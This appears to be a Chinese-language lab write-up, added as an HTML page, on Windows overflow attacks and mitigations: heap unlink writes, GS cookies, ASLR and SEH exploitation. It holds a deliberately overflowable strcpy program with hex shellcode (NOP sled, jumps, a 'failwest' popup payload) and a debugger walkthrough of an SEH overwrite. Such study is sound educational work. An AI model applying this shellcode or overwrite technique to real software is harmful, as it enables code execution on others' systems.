+</p>
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #6434A3;">void</span> <span style="color: #006699;">DeleteBlock</span><span style="color: #707183;">(</span><span style="color: #6434A3;">HeapBlock</span> *<span style="color: #BA36A5;">p</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    p-&gt;next-&gt;previous = p-&gt;previous;
+    p-&gt;previous-&gt;next = p-&gt;next;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+
+<p>
+进行两次内存的 <code>write</code> 操作。
+</p>
+</div>
+
+<div id="outline-container-orga4f7c07" class="outline-3">
+<h3 id="orga4f7c07">DWORD shoot</h3>
+<div class="outline-text-3" id="text-orga4f7c07">
+<blockquote>
+<p>
+or named &rsquo;arbitrary DWORD rest&rsquo;
+</p>
+</blockquote>
+
+<p>
+攻击者可以利用数据覆盖这两个 previous 和 next 指针，例如:
+空闲堆块 <code>*p</code> ，两个指针被覆盖为 <code>p-&gt;previouos=X, p-&gt;next=Y</code> ， 如果 <code>*p</code> 要被分配出去，需要将 <code>*p</code> 从空闲堆块列表删除，执行 <code>DeleteBlock(*p)</code> 操作，即把 <code>Y</code> 指向的地址处的数据写入 <code>X</code> 。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">p-&gt;next-&gt;previous = p-&gt;previous;
+</pre>
+</div>
+<p>
+这个代码实际上是取得 <code>p-&gt;next</code> 这个指针指向的内存处的前 4 个字节（ <code>previous block</code> 就是某一 <code>block</code> 的前 4 字节）， 即对 <code>Y</code> 解引用 <code>*Y</code> ， 则代码变成
+</p>
+<div class="org-src-container">
+<pre class="src src-c">*Y = X;
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-ID-1f728dee-b2af-4987-a257-3593bd11f899" class="outline-2">
+<h2 id="ID-1f728dee-b2af-4987-a257-3593bd11f899">攻防博弈</h2>
+<div class="outline-text-2" id="text-orgaad34be">
+<p>
+<b><b>本质原因：内存中的数据可被当作指令执行。</b></b>
+</p>
+
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">攻</th>
+<th scope="col" class="org-left">防</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">基础缓冲区溢出</td>
+<td class="org-left">GS cookie</td>
+</tr>
+
+<tr>
+<td class="org-left">SEH 利用</td>
+<td class="org-left">SafeSEH</td>
+</tr>
+
+<tr>
+<td class="org-left">P/P/R</td>
+<td class="org-left">SEHOP</td>
+</tr>
+
+<tr>
+<td class="org-left">伪造 SEH 链表</td>
+<td class="org-left">ASLR</td>
+</tr>
+
+<tr>
+<td class="org-left">Heapspray</td>
+<td class="org-left">DEP</td>
+</tr>
+
+<tr>
+<td class="org-left">ROP</td>
+<td class="org-left">DEP+ASLR</td>
+</tr>
+
+<tr>
+<td class="org-left">JIT Spray</td>
+<td class="org-left">&#x2026;</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div id="outline-container-ID-e6ca3800-473a-4be5-b327-388616ac9ab6" class="outline-3">
+<h3 id="ID-e6ca3800-473a-4be5-b327-388616ac9ab6">GS cookie</h3>
+<div class="outline-text-3" id="text-orga20ca47">
+<p>
+又名“金丝雀”，因 18，19 世纪的煤矿中使用“金丝雀”来探测瓦斯泄露而得名。
+</p>
+</div>
+
+<div id="outline-container-org3ba5ead" class="outline-4">
+<h4 id="org3ba5ead">源代码</h4>
+<div class="outline-text-4" id="text-org3ba5ead">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #8D8D84;">//</span><span style="color: #8D8D84; font-style: italic;">#define _CRT_SECURE_NO_WARNINGS</span>
+<span style="color: #808080;">#pragma</span> warning<span style="color: #707183;">(</span>disable:<span style="color: #D0372D;">4996</span><span style="color: #707183;">)</span> <span style="color: #8D8D84;">//</span>
+
+<span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">name</span><span style="color: #707183;">[]</span> = <span style="color: #707183;">{</span>
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>,
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>,
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>,
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>,
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>,
+    <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>, <span style="color: #D0372D;">0x90</span>
+<span style="color: #707183;">}</span>;
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">overFlow</span><span style="color: #707183;">()</span>;
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    overFlow<span style="color: #7388D6;">()</span>;
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Function returned!"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">overFlow</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">output</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">8</span><span style="color: #7388D6;">]</span>;
+    strcpy<span style="color: #7388D6;">(</span>output, name<span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">for</span> <span style="color: #7388D6;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">i</span> = <span style="color: #D0372D;">0</span>; i &lt; <span style="color: #D0372D;">8</span> &amp;&amp; output<span style="color: #909183;">[</span>i<span style="color: #909183;">]</span>; i++<span style="color: #7388D6;">)</span> printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"\\0x%x"</span>, output<span style="color: #909183;">[</span>i<span style="color: #909183;">]</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org47d2a06" class="outline-4">
+<h4 id="org47d2a06">二进制分析</h4>
+<div class="outline-text-4" id="text-org47d2a06">
+<p>
+开启 /GS 编译选项后，程序不能正常执行，在检测到栈溢出之后会引发异常，只能中断退出
+</p>
+
+<figure id="org25c11c8">
+<img src="../images/overflow_attack_heap_overflow_2_1.png" alt="overflow_attack_heap_overflow_2_1.png">
+
+</figure>
+
+<figure id="org8fa000a">
+<img src="../images/overflow_attack_heap_overflow_2_2.png" alt="overflow_attack_heap_overflow_2_2.png">
+
+</figure>
+
+
+<p>
+在单步调试过程中，查看内存与寄存器，内存中 old ebp – 4 就是安全 cookie 的值，该值是随机生成的初始 cookie 与寄存器 EBP 异或得到的值
+</p>
+
+<figure id="org051000b">
+<img src="../images/overflow_attack_heap_overflow_3.png" alt="overflow_attack_heap_overflow_3.png">
+
+</figure>
+
+
+<p>
+寻找初始 cookie，分析反汇编代码可以看到初始 cookie 的地址 04B9034h 处，在内存跳转到该地址，我们可以看到初始 cookie 为 6531546D ， <code>6531546D⊕00CFF8BC = 65FEACD1</code> 等于上图中的 cookie 值
+</p>
+
+
+<figure id="orgac072fa">
+<img src="../images/overflow_attack_heap_overflow_4.png" alt="overflow_attack_heap_overflow_4.png">
+
+</figure>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-ID-6930f1d2-54e1-4e4c-a945-7211a23cd624" class="outline-3">
+<h3 id="ID-6930f1d2-54e1-4e4c-a945-7211a23cd624">动态基址 ASLR</h3>
+<div class="outline-text-3" id="text-org6f25aed">
+<p>
+以 Windows 7 64 位旗舰版，Visual Studio 2013 为例。
+</p>
+</div>
+
+<div id="outline-container-org3a37d27" class="outline-4">
+<h4 id="org3a37d27">源代码</h4>
+<div class="outline-text-4" id="text-org3a37d27">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdlib.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">Windows.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #6434A3;">unsigned</span> <span style="color: #6434A3;">long</span> <span style="color: #BA36A5;">g_var</span> = <span style="color: #D0372D;">0</span>;
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">printAddress</span><span style="color: #707183;">()</span> <span style="color: #707183;">{</span>
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"printAddress's Address: %p\n"</span>, printAddress<span style="color: #7388D6;">)</span>;
+    g_var++;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">int</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">HMODULE</span> <span style="color: #BA36A5;">hMod</span> = LoadLibrary<span style="color: #7388D6;">(</span>L<span style="color: #008000;">"Kernel32.dll"</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #6434A3;">void</span> *<span style="color: #BA36A5;">pvAddress</span> = GetProcAddress<span style="color: #7388D6;">(</span>hMod, <span style="color: #008000;">"LoadLibraryW"</span><span style="color: #7388D6;">)</span>;
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Kernel.dll's Address: %p\n"</span>, hMod<span style="color: #7388D6;">)</span>;
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"LoadLibrary's Address: %p\n"</span>, pvAddress<span style="color: #7388D6;">)</span>;
+    printAddress<span style="color: #7388D6;">()</span>;
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"g_var's Address: %p\n"</span>, &amp;g_var<span style="color: #7388D6;">)</span>;
+
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6;">(</span>hMod<span style="color: #7388D6;">)</span> FreeLibrary<span style="color: #7388D6;">(</span>hMod<span style="color: #7388D6;">)</span>;
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2df62b1" class="outline-4">
+<h4 id="org2df62b1">开启动态基址</h4>
+<div class="outline-text-4" id="text-org2df62b1">
+<p>
+系统 dll 以及系统函数的地址没有改变，全局变量和代码中编写的函数地址每次运行都会改变；
+</p>
+
+<figure id="org3c02556">
+<img src="../images/overflow_attack_aslr_1.png" alt="overflow_attack_aslr_1.png">
+
+</figure>
+
+<p>
+重启电脑后系统 dll 和系统函数改变，全局变量和代码中编写的函数地址每次运行都会改变。
+</p>
+
+<figure id="org112e974">
+<img src="../images/overflow_attack_aslr_2.png" alt="overflow_attack_aslr_2.png">
+
+</figure>
+</div>
+</div>
+
+<div id="outline-container-orgd8446d8" class="outline-4">
+<h4 id="orgd8446d8">关闭动态基址</h4>
+<div class="outline-text-4" id="text-orgd8446d8">
+<p>
+系统 dll 以及系统函数的地址没有改变，全局变量和代码中编写的函数地址每次运行均不会改变；
+</p>
+
+<figure id="org05650cb">
+<img src="../images/overflow_attack_aslr_3.png" alt="overflow_attack_aslr_3.png">
+
+</figure>
+
+<p>
+重启后只是系统 dll 即系统函数地址变了。
+</p>
+
+<figure id="orgefd7dcd">
+<img src="../images/overflow_attack_aslr_4.png" alt="overflow_attack_aslr_4.png">
+
+</figure>
+</div>
+</div>
+</div>
+
+<div id="outline-container-ID-39d4c0f8-0324-43de-8312-a69edad01e47" class="outline-3">
+<h3 id="ID-39d4c0f8-0324-43de-8312-a69edad01e47">SEH 利用</h3>
+<div class="outline-text-3" id="text-org0076689">
+</div>
+
+<div id="outline-container-org3daf945" class="outline-4">
+<h4 id="org3daf945">源代码</h4>
+<div class="outline-text-4" id="text-org3daf945">
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #0000FF;">extern</span> <span style="color: #008000;">"C"</span> <span style="color: #0000FF;">__declspec</span><span style="color: #707183;">(</span>dllimport<span style="color: #707183;">)</span> <span style="color: #006699;">jump</span><span style="color: #707183;">()</span>;
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">stdio.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">string.h</span><span style="color: #707183;">&gt;</span>
+<span style="color: #808080;">#include</span> <span style="color: #707183;">&lt;</span><span style="color: #008000;">windows.h</span><span style="color: #707183;">&gt;</span>
+
+<span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">shellcode</span> <span style="color: #707183;">[]</span> =
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\xeb\x10\x90\x90"</span>
+<span style="color: #008000;">"\x68\x10\x34\x12"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53"</span>
+<span style="color: #008000;">"\x50\x50\x53\xB8\x53\x93\xD2\x77\x33\xDB\x53\x68\x77\x65\x73\x74"</span>
+<span style="color: #008000;">"\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77"</span>
+<span style="color: #008000;">"\xFF\xD0\x53\xB8\xE8\xC0\x80\x7C\xFF\xD0\x90\x90\x90\x90\x90\x90"</span>;
+<span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">x53, xb8, x90, x90, xe8, xc0, x80, x7c, xff, xd0, x90, x90,x0a, x10, x34, x12,</span>
+<span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">x05, x10, x40, x00, // Exception Function</span>
+
+<span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">shellcode1</span><span style="color: #707183;">[]</span> =
+<span style="color: #008000;">"\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53"</span>
+<span style="color: #008000;">"\x50\x50\x53\xB8\x53\x93\xD2\x77\x33\xDB\x53\x68\x77\x65\x73\x74"</span>
+<span style="color: #008000;">"\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77"</span>
+<span style="color: #008000;">"\xFF\xD0\x53\xB8\xE8\xC0\x80\x7C\xFF\xD0\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\x90\x90\x90\xe9"</span>  <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">second jump</span>
+<span style="color: #008000;">"\x34\xff\xff\xff"</span>
+<span style="color: #008000;">"\x90\x90\x90\x90"</span>
+<span style="color: #008000;">"\xeb\xf2\x90\x90"</span>  <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">first jump  // Next SEH record pointer</span>
+<span style="color: #008000;">"\x68\x10\x34\x12"</span>;                <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">SEH hardler</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">ZeroDivisionExcept</span><span style="color: #707183;">(</span><span style="color: #6434A3;">void</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Error!\n"</span><span style="color: #7388D6;">)</span>;
+    printf<span style="color: #7388D6;">(</span><span style="color: #008000;">"Test\n"</span><span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">test</span><span style="color: #707183;">(</span><span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">input</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    <span style="color: #6434A3;">char</span> <span style="color: #BA36A5;">buf</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">200</span><span style="color: #7388D6;">]</span>;
+    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">zero</span> = <span style="color: #D0372D;">0</span>;
+    strcpy<span style="color: #7388D6;">(</span>buf, input<span style="color: #7388D6;">)</span>;
+    __try <span style="color: #7388D6;">{</span>
+        zero = <span style="color: #D0372D;">8</span> / zero;
+        printf<span style="color: #909183;">(</span><span style="color: #008000;">"HHHHH\n"</span><span style="color: #909183;">)</span>;
+    <span style="color: #7388D6;">}</span>
+    __except<span style="color: #7388D6;">(</span>ZeroDivisionExcept<span style="color: #909183;">()</span><span style="color: #7388D6;">)</span> <span style="color: #7388D6;">{}</span>
+    jump<span style="color: #7388D6;">()</span>;
+<span style="color: #707183;">}</span>
+
+<span style="color: #6434A3;">void</span> <span style="color: #006699;">main</span><span style="color: #707183;">(</span><span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">argc</span>, <span style="color: #6434A3;">char</span> <span style="color: #0000FF;">const</span> *<span style="color: #BA36A5;">argv</span><span style="color: #7388D6;">[]</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
+    LoadLibrary<span style="color: #7388D6;">(</span><span style="color: #008000;">"user32.dll"</span><span style="color: #7388D6;">)</span>;
+    test<span style="color: #7388D6;">(</span>shellcode<span style="color: #7388D6;">)</span>;
+<span style="color: #707183;">}</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org710689e" class="outline-4">
+<h4 id="org710689e">二进制分析 shellcode</h4>
+<div class="outline-text-4" id="text-org710689e">
+<p>
+特意构建的 dll 中包含 <code>pop,pop,retn</code> 三条汇编指令，为了跳转回 shellcode 而编写的。基地址是自己设置的 0x12340000，三条汇编指令的起始地址通过 ollydbg 查找得到的是 0x12341068
+</p>
+
+<figure id="orga1a4ef4">
+<img src="../images/overflow_attack_sc_binary_analysis_1.png" alt="overflow_attack_sc_binary_analysis_1.png">
+
+</figure>
+
+
+<p>
+利用缓冲区溢出漏洞覆盖 buf[200] 数组，可以看 buf[]及后面的区域已经被覆盖
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><img src="../images/overflow_attack_sc_binary_analysis_2_1.png" alt="overflow_attack_sc_binary_analysis_2_1.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_sc_binary_analysis_2_2.png" alt="overflow_attack_sc_binary_analysis_2_2.png"></td>
+<td class="org-left"><img src="../images/overflow_attack_sc_binary_analysis_2_3.png" alt="overflow_attack_sc_binary_analysis_2_3.png"></td>
+</tr>
+</tbody>
+</table>
+
+
+<p>
+Pointer to next SEH record 是指向下一个 SEH 异常处理函数，+4 处是 SE handler 是下一个 SEH 异常处理函数的入口地址。这里我们把其覆盖成 jump 函数中三条特意构造用于实现的攻击的汇编指令地址。
+</p>
+
+<p>
+在 ollydbg 中调试知，利用的 windows 内核一个函数的栈帧实施的跳转，这个函数是 windows 用于实现异常处理的，ESP + 8 处是我们覆盖的 next SEH record，我们覆盖的 SEH handler 在此内核函数中的被调用，于是系统在执行这个内核函数时，两次弹栈， 新 ESP = ESP + 8，retn 指令让 EIP 指向 ESP，于是程序跳转回 0x0012ff18，此处我们覆盖的是 0x909010EB，再往内存高位跳转 16 字节，程序跳转到 0x0012ff2a 执行，进入我们覆盖好的第二段 shellcode 执行，shellcode 见源代码，为了正常执行，程序引用了 user32.dll
+</p>
+
+<figure id="orgdb65d32">
+<img src="../images/overflow_attack_sc_binary_analysis_3.png" alt="overflow_attack_sc_binary_analysis_3.png">
+
+</figure>
+
+
+<p>
+Ollydbg 中程序跳转回 shellcode 的情形
+</p>
+
+<figure id="org7175f81">
+<img src="../images/overflow_attack_sc_binary_analysis_4.png" alt="overflow_attack_sc_binary_analysis_4.png">
+
+</figure>
+
+
+<p>
+程序运行后成功弹出“failwest”弹窗。
+</p>
+
+<figure id="org4057942">
+<img src="../images/overflow_attack_sc_binary_analysis_5.png" alt="overflow_attack_sc_binary_analysis_5.png">
+
+</figure>
+
+<p>
+进一步分析，程序利用的 ntd.dll 中的系统函数实现的从异常处理函数跳转回 shellcode ，但从 ollydbg 中的调试情况看，0x3247、0x3282 等地址没有函数，应该是编译器直接使用的那一段地址中的函数的某些部分实现的异常处理，在我们利用的那个异常处理函数中，栈帧很简单， ESP+8 处的值是 next SEH record，给了我们跳转回来的机会，同时也知道了异常处理并不是直接执行 SEH handler 处的函数，而是经过了多次函数调用最后才跳转到 SEH handler 处执行的
+</p>
+
+<figure id="org8690424">
+<img src="../images/overflow_attack_sc_binary_analysis_6.png" alt="overflow_attack_sc_binary_analysis_6.png">
+
+</figure>
+</div>
+</div>
+
+
+<div id="outline-container-org33e4e29" class="outline-4">
+<h4 id="org33e4e29">二进制分析 shellcode1</h4>
+<div class="outline-text-4" id="text-org33e4e29">
+<p>
+利用 JMP SHORT 和 JMP 实现的两步跳转执行的 ShellCode。通过 ollydbg 编写相应的汇编指令，可以得到机器码
+</p>
+
+<p>
+第一次跳转
+</p>
+
+<figure id="org3db9fba">
+<img src="../images/overflow_attack_sc_binary_analysis_7.png" alt="overflow_attack_sc_binary_analysis_7.png">
+
+</figure>
+
+
+<p>
+第二次跳转
+</p>
+
+<figure id="org9f1075d">
+<img src="../images/overflow_attack_sc_binary_analysis_8.png" alt="overflow_attack_sc_binary_analysis_8.png">
+
+</figure>
+
+
+<figure id="org7da0b69">
+<img src="../images/overflow_attack_sc_binary_analysis_9.png" alt="overflow_attack_sc_binary_analysis_9.png">
+
+</figure>
+
+<p>
+程序运行后成功弹出“failwest”弹窗。
+</p>
+
+<figure id="orgad170f7">
+<img src="../images/overflow_attack_sc_binary_analysis_10.png" alt="overflow_attack_sc_binary_analysis_10.png">
+
+</figure>
+
+<p>
+通过 ollydbg 分析后可以编写出精简版的 shellcode，即代码中的 shellcode1。
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+</div>
+</body>
+</html>
